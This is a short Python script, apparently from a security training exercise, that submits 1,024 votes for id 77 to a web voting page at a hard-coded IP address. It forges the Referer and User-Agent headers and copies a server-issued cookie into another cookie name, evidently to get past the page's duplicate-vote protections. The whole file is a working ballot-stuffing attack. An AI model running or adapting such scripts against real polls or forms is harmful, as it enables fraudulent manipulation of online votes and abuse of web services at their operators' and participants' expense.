#!/usr/bin/python3
"""
This module votes for id 77 at given url using requests.
"""
import requests


url = 'http://54.221.6.249/level2.php'
headers = {'Referer': url, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'}
payload = {'id': '77', 'holdthedoor': 'Submit+Query', 'key': ''}
cookies = {'HoldTheDoor': '', 'holdthedoor': ''}
cookies['holdthedoor'] = requests.get(url).cookies['HoldTheDoor']
for i in range(1024):
    r = requests.post(url, data=payload, headers=headers, cookies=cookies)
